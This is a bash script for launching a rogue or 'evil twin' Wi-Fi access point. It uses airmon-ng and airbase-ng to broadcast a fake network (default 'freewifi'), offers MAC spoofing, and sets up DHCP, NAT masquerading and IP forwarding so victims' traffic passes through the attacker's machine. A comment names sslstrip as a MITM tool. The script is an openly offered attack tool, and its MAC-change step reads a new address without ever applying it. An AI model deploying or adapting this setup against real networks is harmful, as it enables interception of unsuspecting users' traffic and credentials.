# #!/bin/bash
# Bash script to launch Ruge Access Point || Evil Twin Access Point.
# version 0.1 by D.H, Y.S, D.S
version="20160605"
clear
#instaling tools option - must also install airmon-ng and airbase-ng
echo -e "\033[32m [+] Before we start you must install isc-dhcp-server and dnsmasq \033[m"
echo -e "\033[36m 	If do you agree to install press Y :\033[m"

read -e ANSWER
if [ "$ANSWER" = "y" ];then

echo -e "\033[31m it will take few mintues :\033[m"
sleep 2
apt-get install isc-dhcp-server
sleep 1
apt-get install dnsmasq
sleep 1
apt-get upgrade
sleep 1
fi
#arp -a giving the the gateaway of the last point in the LAN
echo -e "\033[32m [+] The MAC address of your router is : \033[m"
arp -a
echo -e "\033[32m [+] The MAC address of your intefaces is : \033[m"
sleep 1
ifconfig | grep HWaddr

#getting the MAC address you want - will be used at the airbase-ng part
echo -e "\033[36m 	If you want to change your MAC wifi press Y :\033[m"
read -e CHANGEMAC
if [ "$CHANGEMAC" = "y" ];then
echo -e "\033[36m Enter the interface of you want to change the max adress :\033[m"
read -e MacInterface
ifconfig $MacInterface down
echo -e "\033[36m Enter the MAC adress of you want on the interface :\033[m"
read -e MacAdress


echo -e "\033[36m [+] Your MAC adress is now :\033[m"
sleep 1
ifconfig | grep HWaddr

sleep 2

fi

#start to configure the fake ap
echo -e "\033[36mRunning the script of fakeAP :\033[m"
sleep 1
echo -e "\033[31m [+] Cleaning iptables \033[m"
#init iptables and dhcp server
echo "0" > /proc/sys/net/ipv4/ip_forward #disable the IP Forwarding
iptables --flush # Delete all rules in  chain or all chains
iptables --table nat --flush # delete all table to manipulate
iptables --delete-chain #Delete matching rule from chain
iptables --table nat --delete-chain
killall sslstripid
killall sslstrip # sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.
/etc/init.d/isc-dhcp-server stop
echo "0" > /proc/sys/net/ipv4/ip_forward
#------------------ end of cleaing table ------------------------------------
echo "[-] Cleaned."

#------------------ start to configure the iptables --------------------------

echo -e "\033[31m [+] Configuring iptables... \033[m"
echo "enter the interface of fakeAP or press enter to default"
read -e fakeap_interface
if [ "$fakeap_interface" = "" ];then
	fakeap_interface=wlan0
	echo -e "fakeAP is on interface $fakeap_interface selected as default.\n"
fi
#airmon-ng will open monitor interface for the selcted fake interface
airmon-ng start $fakeap_interface

echo -e "\033[36mGreat! now enter the name of wifi :\033[m"
read -e nameWifi
if [ "$nameWifi" = "" ];then
	nameWifi=freewifi
	echo -e "nameWifi $nameWifi selected as default.\n"
fi

echo -e "\033[36m now enter the chanel of wifi :\033[m"
read -e chanelWifi
if [ "$chanelWifi" = "" ];then
	chanelWifi=1
	echo -e "Chanel $chanelWifi selected as default.\n"
fi
#append mon to the interface name string
fakeap_interface+=mon

sleep 1

#airbase-ng - open access point on at0 virtual interface, -a will change the MAC address, -e the name of the access point, -c the channel, -v monitor interface witch the access point running
if [ "$CHANGEMAC" = "y" ];then
gnome-terminal -e "airbase-ng -a $MacAdress -e $nameWifi -c $chanelWifi -v $fakeap_interface"

else 
gnome-terminal -e "airbase-ng -e $nameWifi -c $chanelWifi -v $fakeap_interface"

fi

sleep 3
#ignore ^c SIGINT
trap "echo [-] Waiting for killing prossess. && killall airbase-ng &&  sleep 1 && airmon-ng stop $fakeap_interface && exit" SIGINT SIGTERM

#creation of IP's configurations. (gateaway, subnet mask, ip address's)
ifconfig at0 up
sleep 1
ifconfig at0 10.0.0.254 netmask 255.255.255.0 
sleep 1
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
sleep 1

#start create the bridge
echo -e "\033[36mGreat! enter the interface for bridge :\033[m"
read -e true_interface
if [ "$true_interface" = "" ];then
	true_interface=eth0
	echo -e "the inteface $true_interface selected as default.\n"
fi

#create chain roles for routing surce/destination
iptables -P FORWARD ACCEPT
sleep 1
iptables -t nat -A POSTROUTING -o $true_interface -j MASQUERADE
sleep 1
#create/clean the file with rouls for dhcp server
echo > '/var/lib/dhcp/dhcpd.leases'
sleep 1
#writing to /etc/dhcpd.conf file the ruoles
echo "authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 10.0.0.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 10.0.0.255;
option routers 10.0.0.254;
option domain-name-servers 8.8.8.8;
range 10.0.0.1 10.0.0.140;
}" > /etc/dhcpd.conf
dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0 
sleep 1
#running dhcp server
/etc/init.d/isc-dhcp-server start




echo -e "$message"
echo -e "\033[31m [+] Activating IP forwarding... \033[m"
#turn on ip_forward
echo "1" > /proc/sys/net/ipv4/ip_forward
sleep 1
echo "[-] Activated."
wait

